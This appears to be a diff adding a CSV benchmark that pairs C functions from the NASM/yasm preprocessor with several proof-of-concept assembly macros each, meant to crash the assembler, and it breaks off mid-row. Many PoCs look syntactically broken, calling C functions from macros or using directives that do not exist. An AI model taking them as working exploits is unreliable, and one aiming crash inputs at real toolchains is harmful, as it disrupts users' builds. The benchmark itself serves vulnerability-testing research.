@@ -1,0 +1,3241 @@
+Vulnerable Code,PoC Exploit Code,Vul_Index
+"int expand_mmacro(Token * tline) { Token *startline = tline; Token *label = NULL; int dont_prepend = 0; Token **params, *t, *tt; MMacro *m; Line *l, *ll; int i, nparam; long *paramlen; t = tline; skip_white_(t); if (!tok_type_(t, TOK_ID) && !tok_type_(t, TOK_PREPROC_ID)) return 0; m = is_mmacro(t, &params); if (!m) { Token *last; label = last = t; t = t->next; if (tok_type_(t, TOK_WHITESPACE)) last = t, t = t->next; if (tok_is_(t, \"":\"")) { dont_prepend = 1; last = t, t = t->next; if (tok_type_(t, TOK_WHITESPACE)) last = t, t = t->next; } if (!tok_type_(t, TOK_ID) || (m = is_mmacro(t, &params)) == NULL) return 0; last->next = NULL; tline = t; } for (nparam = 0; params[nparam]; nparam++); paramlen = nparam ? nasm_malloc(nparam * sizeof(*paramlen)) : NULL; for (i = 0; params[i]; i++) { int brace = FALSE; int comma = (!m->plus || i < nparam - 1); t = params[i]; skip_white_(t); if (tok_is_(t, \""{\"")) t = t->next, brace = TRUE, comma = FALSE; params[i] = t; paramlen[i] = 0; while (t) { if (comma && t->type == TOK_OTHER && !strcmp(t->text, \"",\"")) break; if (comma && t->type == TOK_WHITESPACE && tok_is_(t->next, \"",\"")) break; if (brace && t->type == TOK_OTHER && !strcmp(t->text, \""}\"")) break; t = t->next; paramlen[i]++; } } ll = nasm_malloc(sizeof(Line)); ll->next = istk->expansion; ll->finishes = m; ll->first = NULL; istk->expansion = ll; m->in_progress = TRUE; m->params = params; m->iline = tline; m->nparam = nparam; m->rotate = 0; m->paramlen = paramlen; m->unique = unique++; m->lineno = 0; m->next_active = istk->mstk; istk->mstk = m; for (l = m->expansion; l; l = l->next) { Token **tail; ll = nasm_malloc(sizeof(Line)); ll->finishes = NULL; ll->next = istk->expansion; istk->expansion = ll; tail = &ll->first; for (t = l->first; t; t = t->next) { Token *x = t; if (t->type == TOK_PREPROC_ID && t->text[1] == '0' && t->text[2] == '0') { dont_prepend = -1; x = label; if (!x) continue; } tt = *tail = new_Token(NULL, x->type, x->text, 0); tail = &tt->next; } *tail = NULL; } if (label) { if (dont_prepend < 0) free_tlist(startline); else { ll = nasm_malloc(sizeof(Line)); ll->finishes = NULL; ll->next = istk->expansion; istk->expansion = ll; ll->first = startline; if (!dont_prepend) { while (label->next) label = label->next; label->next = tt = new_Token(NULL, TOK_OTHER, \"":\"", 0); } } } list->uplevel(m->nolist ? LIST_MACRO_NOLIST : LIST_MACRO); return 1; }""","%macro trigger_expand_mmacro_crash 0
+    %define %$tline %1
+    %define %$t %$tline
+    %define %$label NULL
+    %define %$dont_prepend 0
+    %define %$params NULL
+    %define %$m NULL
+    %define %$l NULL
+    %define %$ll NULL
+    %define %$i 0
+    %define %$nparam 0
+    %define %$paramlen NULL
+
+    struc Token
+        .type resb 1
+        .text resb 3
+        .next resb 8
+    endstruc
+
+    %assign %$token_instance token_instance
+    token_instance:
+        db TOK_PREPROC_ID
+        db '0', '0', '0'
+        dq 0
+
+    %define %$tline %$token_instance
+    mov rdi, %$tline
+    call expand_mmacro
+%endmacro
+
+trigger_expand_mmacro_crash",vul1_1
+,"%macro crash_expand_mmacro 0
+    %struc TOK_PREPROC_ID
+        .type resb 1
+        .text resb 1
+    %endstruc
+
+    %assign %$t new_TOK_PREPROC_ID
+    %substr %$t.text 0, 0
+
+    %define %$token_list %$t
+
+    %rep 1
+        expand_mmacro %$token_list
+    %endrep
+%endmacro
+
+crash_expand_mmacro",vul1_2
+,"%macro crash_expand_mmacro 0
+    %define %$token1 TOK_PREPROC_ID
+    %define %$token2 TOK_OTHER
+    %define %$text1 ""00""
+    %define %$text2 "",""
+    
+    %struc bad_token
+        .type resb 1
+        .text resb 3
+    %endstruc
+
+    bad_token1: resb bad_token_size
+    bad_token2: resb bad_token_size
+
+    db %$token1, 0, %$text1, 0 at bad_token1
+    db %$token2, 0, %$text2, 0 at bad_token2
+    dd bad_token2 at bad_token1 + bad_token.type
+
+    %rep 1
+        db bad_token1
+    %endrep
+%endmacro
+
+crash_expand_mmacro",vul1_3
+,"%macro crash_yasm 0
+    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""00exploit"", 0)
+    %assign %$t %$token
+    %rep 1
+        %ifid %$t
+            %error ""Triggering vulnerability in expand_mmacro""
+        %endif
+    %endrep
+%endmacro
+
+crash_yasm",vul1_4
+,"%macro crash_expand_mmacro 0
+    %define %$t new_Token(NULL, TOK_PREPROC_ID, ""00"", 0)
+    %assign %$t.next NULL
+    %define %$tline %$t
+    %define %$dont_prepend 0
+    %define %$label NULL
+    %define %$params NULL
+    %define %$m NULL
+    %define %$l NULL
+    %define %$ll NULL
+    %define %$i 0
+    %define %$nparam 0
+    %define %$paramlen NULL
+
+    expand_mmacro(%$tline)
+%endmacro
+
+crash_expand_mmacro",vul1_5
+,"%macro crash_expand_mmacro 0
+    %define %$tline %1
+    %define %$token %$tline_ %+ 0
+    %define %$next_token %$token_ %+ 1
+
+    %assign %$token.type TOK_PREPROC_ID
+    %assign %$token.text ""00""
+    %assign %$token.next %$next_token
+
+    %assign %$next_token.type TOK_OTHER
+    %assign %$next_token.text "",""
+    %assign %$next_token.next NULL
+
+    %assign %$tline %$token
+
+    %rep 1
+        expand_mmacro %$tline
+    %endrep
+%endmacro
+
+crash_expand_mmacro",vul1_6
+,"%macro crash_expand_mmacro 0
+    %define %$token_type TOK_PREPROC_ID
+    %define %$token_text ""00fake_token""
+    
+    %assign %$token %$token_type
+    %assign %$text %$token_text
+
+    %rep 1
+        %define %$token %$token_type
+        %define %$text %$token_text
+    %endrep
+
+    %rep 1
+        %define %$token %$token_type
+        %define %$text %$token_text
+    %endrep
+%endmacro
+
+crash_expand_mmacro",vul1_7
+,"%macro trigger_preproc_id_mismatch 0
+    %define fake_token.type TOK_PREPROC_ID
+    %define fake_token.text ""00fake""
+    %assign fake_token.next NULL
+
+    %define tline &fake_token
+    %define params NULL
+
+    expand_mmacro tline
+%endmacro
+
+trigger_preproc_id_mismatch",vul1_8
+,"%macro crash_macro 0
+    %define %$short_preproc_id `00`
+    %assign %$token_type TOK_PREPROC_ID
+    %strcat %$malformed_token %$token_type %$short_preproc_id
+    %emit %$malformed_token
+%endmacro
+
+crash_macro",vul1_9
+,"%macro trigger_preproc_token_type_mismatch 0
+    %define %$token new_Token(NULL, TOK_PREPROC_ID, ""0"", 0)
+    %assign %$t %$token
+    %ifid %$t
+        %error ""This should not happen if memory is accessed safely.""
+    %endif
+%endmacro
+
+trigger_preproc_token_type_mismatch",vul1_10
+"expand_mmac_params(Token * tline) { Token *t, *tt, **tail, *thead; tail = &thead; thead = NULL; while (tline) { if (tline->type == TOK_PREPROC_ID && (((tline->text[1] == '+' || tline->text[1] == '-') && tline->text[2]) || tline->text[1] == '%' || (tline->text[1] >= '0' && tline->text[1] <= '9'))) { char *text = NULL; int type = 0, cc; char tmpbuf[30]; char *second_text = NULL; int n, i; MMacro *mac; t = tline; tline = tline->next; second_text = strchr(t->text, ':'); mac = istk->mstk; while (mac && !mac->name) mac = mac->next_active; if (!mac) error(ERR_NONFATAL, '`%s': not in a macro call', t->text); else { if (second_text) { int end = atoi(second_text+1)-1; int is_fst = 1; int k; n = atoi(t->text + 1)-1; if (end < 0) end += mac->nparam; for (k = n; k <= end; k++) { if (k >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) k = (k + mac->rotate) % mac->nparam; tt = mac->params[k]; } if (tt) { if (!is_fst && mac->paramlen[k]) { *tail = new_Token(NULL, TOK_OTHER, ',', 0); tail = &(*tail)->next; } if (mac->paramlen[k]) is_fst = 0; for (i = 0; i < mac->paramlen[k]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } else { switch (t->text[1]) { case '0': type = TOK_NUMBER; sprintf(tmpbuf, '%ld', mac->nparam); text = nasm_strdup(tmpbuf); break; case '%': type = TOK_ID; sprintf(tmpbuf, '..@%lu.', mac->unique); text = nasm_strcat(tmpbuf, t->text + 2); break; case '-': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; if (inverse_ccs[cc] == -1) { error(ERR_NONFATAL, 'condition code `%s' is not invertible', conditions[cc]); text = NULL; } else text = nasm_strdup(conditions[inverse_ccs [cc]]); } break; case '+': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; text = nasm_strdup(conditions[cc]); } break; default: n = atoi(t->text + 1) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } if (tt) { for (i = 0; i < mac->paramlen[n]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } } if (!text) { delete_Token(t); } else { *tail = t; tail = &t->next; t->type = type; nasm_free(t->text); t->text = text; t->mac = NULL; } continue; } else { t = *tail = tline; tline = tline->next; t->mac = NULL; tail = &t->next; } } *tail = NULL; t = thead; for (; t && (tt = t->next) != NULL; t = t->next) switch (t->type) { case TOK_WHITESPACE: if (tt->type == TOK_WHITESPACE) { t->next = delete_Token(tt); } break; case TOK_ID: if (tt->type == TOK_ID || tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; case TOK_NUMBER: if (tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; } return thead; }","%macro crash_macro 1
+    %rep 1000000  ; Large repetition to manipulate rotation and indexing
+        %rotate 1
+        %+1: %+1
+    %endrep
+%endmacro
+
+%define %+1 a
+crash_macro %+1",vul2_1
+,"%macro crash_yasm 0
+    %define huge_value 2147483647 ; Large integer to induce overflow
+    %assign %$rotate huge_value
+    %rep 1
+        %xdefine %+ %$rotate
+    %endrep
+    %rotate huge_value
+    %rep 1
+        %x 1
+    %endrep
+%endmacro
+
+crash_yasm",vul2_2
+,"%macro crash_macro 0
+    %assign %$rotate 1
+    %assign %$nparam 1
+    %define %$params[0] 12345
+    %rep 2
+        %rotate 1
+        %xdefine %$params[%$rotate] (%$params[%$rotate-1] + 1)
+    %endrep
+    %error ""Triggering access violation with rotated parameter: %$params[1]""
+%endmacro
+
+crash_macro",vul2_3
+,"%macro trigger_vulnerability 0
+    %define %$rotate 5
+    %define %$nparam 1
+    %rep 10
+        %xdefine %+ %1
+    %endrep
+%endmacro
+
+%macro setup 0
+    %assign %$rotate -1
+    %assign %$nparam 0
+    trigger_vulnerability
+%endmacro
+
+setup",vul2_4
+,"%macro crash_yasm 0
+    %rep 1
+        %1
+    %endrep
+%endmacro
+
+%define %$param1 1
+%define %$param2 2
+
+%assign %$index 3  ; Intentionally out of bounds
+crash_yasm %$param%$index",vul2_5
+,"%macro crash_yasm 0
+    %define mac.nparam 3
+    %define mac.rotate 2147483647
+    %define mac.params 0x123456
+
+    %assign k 2
+    %rep 1
+        %assign k (k + mac.rotate) % mac->nparam
+        %if k >= mac.nparam
+            %error ""Index out of bounds""
+        %endif
+    %endrep
+%endmacro
+
+crash_yasm",vul2_6
+,"%macro crash_yasm 0
+    %rep 1
+        %1: .equ 0
+    %endrep
+%endmacro
+
+%define idx 999999
+crash_yasm %1: %+ idx
+
+%macro setup 0
+    %assign i 0
+    %rep 5
+        %xdefine param%+i i
+        %assign i i+1
+    %endrep
+%endmacro
+
+setup
+crash_yasm param999999",vul2_7
+,"%macro crash_macro 1
+    %rep 1000000
+        %+1: %+1
+    %endrep
+%endmacro
+
+%define %+1 1
+crash_macro %+1",vul2_8
+"pp_getline(void) { char *line; Token *tline; while (1) { tline = NULL; if (first_line) { poke_predef(predef); poke_predef(stddef); poke_predef(builtindef); first_line = 0; } if (!istk) return NULL; while (istk->expansion && istk->expansion->finishes) { Line *l = istk->expansion; if (!l->finishes->name && l->finishes->in_progress > 1) { Line *ll; l->finishes->in_progress--; for (l = l->finishes->expansion; l; l = l->next) { Token *t, *tt, **tail; ll = nasm_malloc(sizeof(Line)); ll->next = istk->expansion; ll->finishes = NULL; ll->first = NULL; tail = &ll->first; for (t = l->first; t; t = t->next) { if (t->text || t->type == TOK_WHITESPACE) { tt = *tail = new_Token(NULL, t->type, t->text, 0); tail = &tt->next; } } istk->expansion = ll; } } else { if (defining) { if (defining->name) error(ERR_PANIC, 'defining with name in expansion'); else if (istk->mstk->name) error(ERR_FATAL, '`%%rep' without `%%endrep' within expansion of macro `%s'', istk->mstk->name); } MMacro *m = istk->mstk; istk->mstk = m->next_active; if (m->name) { nasm_free(m->params); free_tlist(m->iline); nasm_free(m->paramlen); l->finishes->in_progress = FALSE; } else free_mmacro(m); istk->expansion = l->next; nasm_free(l); list->downlevel(LIST_MACRO); } } while (1) { if (istk->expansion) { char *p; Line *l = istk->expansion; if (istk->mstk) istk->mstk->lineno++; tline = l->first; istk->expansion = l->next; nasm_free(l); p = detoken(tline, FALSE); list->line(LIST_MACRO, p); nasm_free(p); break; } line = read_line(); if (line) { line = prepreproc(line); tline = tokenise(line); nasm_free(line); break; } Include *i = istk; if (i->fp != first_fp) fclose(i->fp); if (i->conds) error(ERR_FATAL, 'expected `%%endif' before end of file'); if (i->next) { nasm_src_set_linnum(i->lineno); nasm_free(nasm_src_set_fname(nasm_strdup(i->fname))); } istk = i->next; list->downlevel(LIST_INCLUDE); nasm_free(i->fname); nasm_free(i); if (!istk) return NULL; if (istk->expansion && istk->expansion->finishes) break; } if (!defining && !(istk->conds && !emitting(istk->conds->state))) tline = expand_mmac_params(tline); if (do_directive(tline) == DIRECTIVE_FOUND) { continue; } else if (defining) { Line *l = nasm_malloc(sizeof(Line)); l->next = defining->expansion; l->first = tline; l->finishes = FALSE; defining->expansion = l; continue; } else if (istk->conds && !emitting(istk->conds->state)) { free_tlist(tline); continue; } else if (istk->mstk && !istk->mstk->in_progress) { free_tlist(tline); continue; } else { tline = expand_smacro(tline); if (!expand_mmacro(tline)) { if (tasm_compatible_mode) tline = tasm_join_tokens(tline); line = detoken(tline, TRUE); free_tlist(tline); break; } else { continue; } } } return line; }","%macro trigger_pp_getline_crash 0
+    %define %$tline %1
+    %define %$l %2
+    %define %$tail %3
+
+    %assign %$l nasm_malloc(sizeof(Line))
+    %assign %$tline new_Token(NULL, TOK_WHITESPACE, NULL, 0)
+    %assign %$tail %$tline
+
+    ; Create a circular reference in token list
+    %$tail.next = %$tline
+
+    ; Force pp_getline to process this corrupted token list
+    %$l.first = %$tline
+    %$l.next = NULL
+    %$l.finishes = FALSE
+
+    ; Simulate the environment where pp_getline is called
+    %assign istk %$l
+%endmacro
+
+trigger_pp_getline_crash",vul3_1
+,"%macro trigger_null_pointer 0
+    %rep 1
+        %assign %$l NULL
+        %define istk->expansion %$l
+    %endrep
+%endmacro
+
+trigger_null_pointer",vul3_2
+,"%macro crash_pp_getline 0
+    ; Triggering invalid memory access in pp_getline by manipulating token expansion
+    %rep 1
+        %define %$malformed_token NULL
+        %assign %$malformed_expansion 1
+        %if %$malformed_expansion
+            %error ""Simulated error to trigger unexpected token expansion path""
+        %endif
+    %endrep
+%endmacro
+
+; Execute the macro to simulate the condition in pp_getline
+crash_pp_getline",vul3_3
+,"%macro trigger_null_pointer 0
+    ; Simulate the condition where istk->expansion is not NULL but l->first is NULL
+    struc Line
+        .next resq 1
+        .finishes resq 1
+        .first resq 1  ; Deliberately set to NULL (0)
+    endstruc
+
+    ; Allocate memory for a Line structure and set it as the current expansion
+    %define l nasm_malloc(sizeof(Line))
+    mov [l.first], 0  ; Explicitly set first to NULL to simulate the condition
+
+    ; Mock the istk structure to point to our crafted Line structure
+    %define istk nasm_malloc(sizeof(Include))
+    mov [istk.expansion], l
+
+    ; Trigger the pp_getline function which will attempt to access l->first
+    call pp_getline
+%endmacro
+
+trigger_null_pointer",vul3_4
+,"%macro crash_yasm 0
+    struc bad_struct
+        .field resb 1
+    endstruc
+
+    %define mac (bad_struct [0])
+
+    %assign mac.name 0
+    %rep 1
+        %rotate 1
+        %xdefine %+ mac %+ .name %+ 1 %+ 2 %+ 3 %+ 4 %+ 5 %+ 6 %+ 7 %+ 8 %+ 9 %+ 0
+    %endrep
+%endmacro
+
+crash_yasm",vul4_2
+,"%macro trigger_crash 0
+    %define %+ %1
+%endmacro
+
+%macro setup_invalid_macro 0
+    %assign %$mac_name NULL
+    %define %+ %$mac_name
+%endmacro
+
+setup_invalid_macro
+trigger_crash",vul4_3
+,"%macro crash_yasm 0
+    %define %$mac NULL
+    %assign %$mac.name NULL
+    %rep 1
+        %xdefine %+ %$mac
+    %endrep
+%endmacro
+
+crash_yasm",vul4_4
+,"%macro exploit_macro 0
+    %define %$mac NULL
+    %assign %$mac.next_active NULL
+    %assign %$mac.name NULL
+    %assign %$mac.nparam 0
+    %assign %$mac.rotate 0
+    %assign %$mac.params NULL
+    %assign %$mac.paramlen NULL
+
+    %rep 1
+        %$mac.next_active: dd 0
+        %$mac.name: dd 0
+        %$mac.nparam: dd 0
+        %$mac.rotate: dd 0
+        %$mac.params: dd 0
+        %$mac.paramlen: dd 0
+    %endrep
+%endmacro
+
+exploit_macro",vul4_5
+,"%macro crash_macro 0
+    %define mac->nparam 3
+    %define mac->rotate 0x7FFFFFFF
+    %define mac->params {1, 2, 3}
+    %rep 1
+        %+1: ; Force rotation calculation overflow
+    %endrep
+%endmacro
+
+crash_macro",vul4_6
+"int find_cc(Token * t) { Token *tt; int i, j, k, m; skip_white_(t); if (t->type != TOK_ID) return -1; tt = t->next; skip_white_(tt); if (tt && (tt->type != TOK_OTHER || strcmp(tt->text, \"",\""))) return -1; i = -1; j = elements(conditions); while (j - i > 1) { k = (j + i) / 2; m = nasm_stricmp(t->text, conditions[k]); if (m == 0) { i = k; j = -2; break; } else if (m < 0) { j = k; } else i = k; } if (j != -2) return -1; return i;","%macro trigger_find_cc 0
+    %define TOK_ID 1
+    %define TOK_OTHER 2
+    %define TOK_PREPROC_ID 3  ; Incorrect token type that should be handled as TOK_ID
+
+    %struc token
+        .type resb 1
+        .next resq 1
+        .text resb 64
+    %endstruc
+
+    %assign %$token token
+    %assign %$next_token token + token.size
+
+    db TOK_PREPROC_ID
+    dq %$next_token
+    db 'condition', 0
+
+    %struc token
+        .type resb 1
+        .next resq 1
+        .text resb 64
+    %endstruc
+    db TOK_OTHER
+    dq 0
+    db ',', 0
+%endmacro
+
+trigger_find_cc",vul5_1
+,"%macro crash_find_cc 0
+    struc Token
+        .type resb 1
+        .next resq 1
+        .text resb 8
+    endstruc
+
+    section .bss
+    token_instance resb Token_size
+
+    section .text
+    %define t token_instance
+    mov byte [t+Token.type], TOK_OTHER
+    mov qword [t+Token.next], 0
+
+    extern find_cc
+    call find_cc t
+%endmacro
+
+crash_find_cc",vul5_2
+,"%macro trigger_find_cc 0
+    struc Token
+        .type resb 1
+        .next resq 1
+        .text resb 8
+    endstruc
+
+    section .data
+    token_instance Token 0x00, 0, ""fake""
+
+    section .text
+    %define t token_instance
+    %assign t.type TOK_OTHER
+    %assign t.next 0
+
+    extern find_cc
+    call find_cc t
+%endmacro
+
+trigger_find_cc",vul5_3
+,"%macro trigger_find_cc 0
+    %struc Token
+        type resb 1
+        next resb 8
+        text resb 16
+    %endstruc
+
+    %define TOK_ID 1
+    %assign %$t Token
+
+    db 0
+    dq %$t+17
+    db ""condition1"", 0
+
+    %assign %$tt Token
+    db 1
+    dq 0
+    db "","", 0
+
+    %rep 1
+        db 0
+    %endrep
+%endmacro
+
+trigger_find_cc",vul5_4
+,"%macro crash_find_cc 0
+    struc Token
+        .type resb 1
+        .next resb 8
+        .text resb 8
+    endstruc
+
+    section .data
+    token Token 0x00, 0, 0
+
+    section .text
+    %define t token
+    %assign t.type TOK_OTHER
+    %assign t.next 0
+    %assign t.text 0
+
+    call find_cc
+%endmacro
+
+crash_find_cc",vul5_5
+,"%macro crash_find_cc 0
+    struc Token
+        .type resb 1
+        .next resq 1
+        .text resb 8
+    endstruc
+
+    section .data
+    token_instance Token 0x00, 0, ""dummy""
+
+    section .text
+    %define t token_instance
+    %assign t.type TOK_OTHER
+
+    mov rdi, t
+    call find_cc
+%endmacro
+
+crash_find_cc",vul5_6
+,"%macro trigger_find_cc_crash 0
+    %struc Token
+        .type resb 1
+        .next resb 8
+        .text resb 8
+    %endstruc
+
+    %define TOK_ID 1
+    %define TOK_OTHER 2
+
+    %assign %$token Token
+    %assign %$token.type TOK_ID
+    %assign %$token.next 0
+    %assign %$token.text conditions
+
+    find_cc %$token
+%endmacro
+
+trigger_find_cc_crash",vul5_7
+"Token *new_Token(Token *next, int type, const char *text, size_t txtlen) { Token *t; int i; if (freeTokens == NULL) { freeTokens = (Token *)new_Block(TOKEN_BLOCKSIZE * sizeof(Token)); for (i = 0; i < TOKEN_BLOCKSIZE - 1; i++) freeTokens[i].next = &freeTokens[i + 1]; freeTokens[i].next = NULL; } t = freeTokens; freeTokens = t->next; t->next = next; t->mac = NULL; t->type = type; if (type == TOK_WHITESPACE || text == NULL) { t->text = NULL; } else { if (txtlen == 0) txtlen = strlen(text); t->text = nasm_malloc(1 + txtlen); strncpy(t->text, text, txtlen); t->text[txtlen] = '\\0'; } return t;","%macro trigger_token_overflow 0
+    %define huge_length 0xFFFFFFFF
+    %strcat long_string ""A"" * huge_length
+
+    %assign %$token_type TOK_IDENTIFIER
+    %assign %$next_token NULL
+
+    %rep 1
+        new_Token %$next_token, %$token_type, long_string, huge_length
+    %endrep
+%endmacro
+
+trigger_token_overflow",vul6_1
+,"%macro trigger_token_overflow 0
+    %assign %$txtlen 0xFFFFFFFF
+    %define %$text ""A""
+
+    %struc Token
+        .next resq 1
+        .mac resq 1
+        .type resd 1
+        .text resq 1
+    %endstruc
+
+    %define %$token Token
+
+    %rep 1
+        new_Token NULL, 1, %$text, %$txtlen
+    %endrep
+%endmacro
+
+trigger_token_overflow",vul6_2
+,"%macro trigger_token_overflow 0
+    %define huge_length 0xffffffffffffffff
+    %struc bad_token
+        .next resq 1
+        .type resd 1
+        .text resb 1
+    %endstruc
+
+    section .data
+    bad_text db 'A', 0
+    bad_token_instance bad_token
+
+    section .text
+    mov rdi, bad_token_instance.next
+    mov rsi, 1
+    mov rdx, bad_text
+    mov rcx, huge_length
+    call new_Token
+%endmacro
+
+trigger_token_overflow",vul6_3
+,"%macro trigger_new_token_overflow 0
+    %struc Token
+        .next resb 8
+        .mac resb 8
+        .type resd 1
+        .text resb 8
+    %endstruc
+
+    %define huge_length 0xFFFFFFFFFFFFFFFF
+    %assign %$text_ptr nasm_malloc(1)
+    %define %$text ""A""
+
+    %define %$token_ptr new_Token(NULL, 1, %$text_ptr, huge_length)
+%endmacro
+
+trigger_new_token_overflow",vul6_4
+,"%macro trigger_token_overflow 0
+    %define huge_length 0xffffffffffffffff
+    %struc bad_token
+        .next resq 1
+        .type resd 1
+        .text resb 1
+    %endstruc
+
+    section .data
+    bad_text db 'A', 0
+
+    %define %$simulate_new_token
+        mov rdi, NULL
+        mov rsi, TOK_PREPROC_ID
+        mov rdx, bad_text
+        mov rcx, huge_length
+        call new_Token
+    %enddefine
+
+    %$simulate_new_token
+%endmacro
+
+trigger_token_overflow",vul6_5
+,"%macro crash_new_token 0
+    %struc Token
+        .next resq 1
+        .mac resq 1
+        .type resd 1
+        .text resq 1
+    %endstruc
+
+    %define TOKEN_BLOCKSIZE 10
+    %define TOK_WHITESPACE 1
+
+    section .data
+    token_instance Token
+
+    %assign %$txtlen 0xFFFFFFFFFFFFFFFF
+    %define %$text ""A""
+
+    %rep 1
+        new_Token token_instance, TOK_WHITESPACE, %$text, %$txtlen
+    %endrep
+%endmacro
+
+crash_new_token",vul6_6
+,"%macro trigger_overflow 0
+    %define huge_length 0xFFFFFFFF
+    %struc bad_input
+        .next resb 1
+        .type resb 1
+        .text resb 1
+        .txtlen resd 1
+    %endstruc
+
+    %assign %$input bad_input
+    [%$input.txtlen]: dd huge_length
+
+    %define %$text ""A""
+    %rep huge_length
+        %$text: db ""A""
+    %endrep
+
+    new_Token NULL, 1, %$text, [%$input.txtlen]
+%endmacro
+
+trigger_overflow",vul6_7
+,"%macro trigger_integer_overflow 0
+    struc Token
+        .next resq 1
+        .mac resq 1
+        .type resd 1
+        .text resq 1
+    endstruc
+
+    section .data
+    large_txtlen equ 0xFFFFFFFFFFFFFFFF
+
+    %assign %$txt ""A""
+    %rep large_txtlen
+        %assign %$txt %+ ""A""
+    %endrep
+
+    %define create_token new_Token(NULL, 1, %$txt, large_txtlen)
+
+    %rep 1
+        create_token
+    %endrep
+%endmacro
+
+trigger_integer_overflow",vul6_8
+,"%macro trigger_token_overflow 0
+    struc Token
+        .next resq 1
+        .mac resq 1
+        .type resd 1
+        .text resq 1
+    endstruc
+
+    section .data
+    large_text db 0x00
+
+    section .text
+    %define SIZE_MAX 0xFFFFFFFFFFFFFFFF
+    %assign txtlen SIZE_MAX
+    %assign type 1
+
+    %rep 1
+        extern new_Token
+        mov rdi, 0
+        mov rsi, type
+        mov rdx, large_text
+        mov rcx, txtlen
+        call new_Token
+    %endrep
+%endmacro
+
+trigger_token_overflow",vul6_9
+"int expr_traverse_nodes_post(yasm_expr *e, void *d, int (*func) (yasm_expr *e, void *d)) { int i; if (!e) return 0; for (i = 0; i < e->numterms; i++) { if (e->terms[i].type == YASM_EXPR_EXPR && expr_traverse_nodes_post(e->terms[i].data.expn, d, func)) return 1; } return func(e, d);","%macro create_deep_expr 1
+    %if %1 > 0
+        struc expr
+            .type resb 1
+            .data resb 8
+        alignb 8
+        expr:
+            db YASM_EXPR_EXPR
+            dq expr-%1
+        %assign %1 %1-1
+        %rep 1
+            create_deep_expr %1
+        %endrep
+    %endif
+%endmacro
+
+%macro trigger_overflow 0
+    create_deep_expr 1000
+%endmacro
+
+trigger_overflow",vul7_1
+,"%macro create_expr 0
+    %assign i 0
+    %rep 10000
+        %if i % 2
+            %define expr (expr + i)
+        %else
+            %define expr (expr - i)
+        %endif
+        %assign i i+1
+    %endrep
+    expr
+%endmacro
+
+%macro trigger_overflow 0
+    create_expr
+%endmacro
+
+trigger_overflow",vul7_2
+,"%macro create_deep_expr 1
+    %if %1 > 0
+        struc expr
+            .type resb 1
+            .data resb 8
+        endstruc
+
+        %assign %%next %1-1
+        create_deep_expr %%next
+
+        %define expr_data expr.data
+        %define expr_type YASM_EXPR_EXPR
+        %define expr_terms expr_type, expr_data
+    %endif
+%endmacro
+
+%macro trigger_overflow 0
+    create_deep_expr 10000
+    expr_traverse_nodes_post expr, NULL, NULL
+%endmacro
+
+trigger_overflow",vul7_3
+,"%macro create_deep_expr 1
+    %if %1 > 0
+        %define expr_%1 expr_%1-1
+        create_deep_expr %1-1
+    %else
+        %define expr_0 0
+    %endif
+%endmacro
+
+%macro exploit_expr_traverse_nodes_post 0
+    create_deep_expr 1000
+    %assign i 0
+    %rep 1000
+        db expr_%i
+        %assign i i+1
+    %endrep
+%endmacro
+
+exploit_expr_traverse_nodes_post",vul7_4
+,"%macro generate_deep_expr 1
+    %if %1 > 0
+        generate_deep_expr %1-1
+    %else
+        db ""Terminal Expression""
+    %endif
+%endmacro
+
+%macro fake_expr_traverse_nodes_post 0
+    %assign depth 1000
+    generate_deep_expr depth
+%endmacro
+
+fake_expr_traverse_nodes_post",vul7_5
+,"%macro create_deep_expr 1
+    %if %1 > 0
+        struc expr
+            .type resb 1
+            .data resb 8
+        endstruc
+
+        %assign %%next_level %1-1
+        create_deep_expr %%next_level
+
+        %define %$expr_instance expr
+        %define %$expr_type YASM_EXPR_EXPR
+        %define %$data_offset expr.data
+
+        %$expr_instance.type db %$expr_type
+        %$expr_instance.data dq %$data_offset
+    %endif
+%endmacro
+
+%macro trigger_overflow 0
+    create_deep_expr 10000
+%endmacro
+
+trigger_overflow",vul7_6
+,"%macro create_deep_expr 1
+    %if %1 > 0
+        struc expr
+            .type resb 1
+            .data resb 8
+        alignb 8
+        endstruc
+
+        %assign next_level %1 - 1
+        create_deep_expr next_level
+
+        %define expr_data expr
+        %define expr_type YASM_EXPR_EXPR
+
+        expr_traverse_nodes_post expr_data, NULL, NULL
+    %endif
+%endmacro
+
+create_deep_expr 1000",vul7_7
+"yasm_ex yasm_section_bcs_first(yasm_section *sect) { return STAILQ_FIRST(&sect->bcs); } yasm_bytecode * yasm_section_bcs_last(yasm_section *sect) { return STAILQ_LAST(&sect->bcs, yasm_bytecode, link); }","%macro crash_yasm_section_bcs_first 0
+    struc fake_yasm_section
+        .bcs resb 1
+    endstruc
+
+    section .data
+    fake_sect: istruc fake_yasm_section
+        at fake_yasm_section.bcs, db 0x00
+    iend
+
+    section .text
+    %define sect fake_sect
+    %assign %$result yasm_section_bcs_first(sect)
+%endmacro
+
+crash_yasm_section_bcs_first",vul8_1
+,"%macro trigger_section_bcs_first 0
+    struc yasm_section
+        .bcs resb 1
+    endstruc
+
+    section .data
+    corrupt_section db 0x00
+
+    %define sect corrupt_section
+
+    %rep 1
+        db yasm_section_bcs_first(sect)
+    %endrep
+%endmacro
+
+trigger_section_bcs_first",vul8_2
+,"%macro fake_yasm_section 0
+    db 0x0  ; simulate empty or corrupted 'bcs' field in yasm_section structure
+%endmacro
+
+section .text
